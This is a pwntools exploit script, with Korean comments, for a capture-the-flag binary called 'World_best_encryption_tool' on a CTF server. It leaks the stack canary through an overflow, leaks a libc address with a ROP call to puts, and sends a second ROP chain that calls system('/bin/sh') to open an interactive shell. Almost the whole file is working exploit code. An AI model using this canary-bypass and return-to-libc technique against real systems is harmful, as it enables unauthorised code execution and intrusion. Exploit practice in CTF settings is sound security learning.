from pwn import *
from Crypto.Util.number import bytes_to_long


r = remote("ctf.j0n9hyun.xyz", 3027)
# r = process("./register")


# lib = ELF("./libc.so.6")
e = ELF("./World_best_encryption_tool")
'''
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
'''


pr = 0x004008e3
main = 0x0000000000400727

# 카나리 하위 바이트는 0x00으로 고정

r.recvuntil("Your text)\n")


# get canary
r.sendline(b"a" * 0x38 + b"b") 
log.info(r.recv(0x48))
canary = u64(r.recv(8)) - ord('b')
log.info(hex(canary))
sleep(0.1)

r.recvuntil("(Yes/No)\n")
r.sendline("Yes")
sleep(0.1)
# ROP
# libc leak
r.recvuntil("Your text)\n")

payload  = b""
payload += b"a" * 0x38
payload += b"\x00"
payload += b"b" * 63
payload += p64(canary)
payload += b"b" * 0x8
payload += p64(pr)
payload += p64(0x601048)
payload += p64(e.plt['puts'])
payload += p64(main)


pause()
r.sendline(payload)
pause()
sleep(0.1)

log.info(r.recvuntil("(Yes/No)\n"))
sleep(0.1)
r.sendline("No")
sleep(0.1)

pause()

libc_base = u64(r.recvuntil("\n")[:-1].ljust(8, b"\x00"))

# 전이랑 바낌..
libc_system = libc_base + 	0x045390 - 0x06b4d0
libc_binsh = libc_base + 0x18cd57 - 0x06b4d0

print(hex(libc_base))
sleep(0.1)

payload  = b""
payload += b"a" * 0x38
payload += b"\x00"
payload += b"b" * 63
payload += p64(canary)
payload += b"b" * 0x8
payload += p64(pr)
payload += p64(libc_binsh)
payload += p64(libc_system)

r.sendline(payload)

sleep(0.1)

r.sendline("No")

r.interactive()





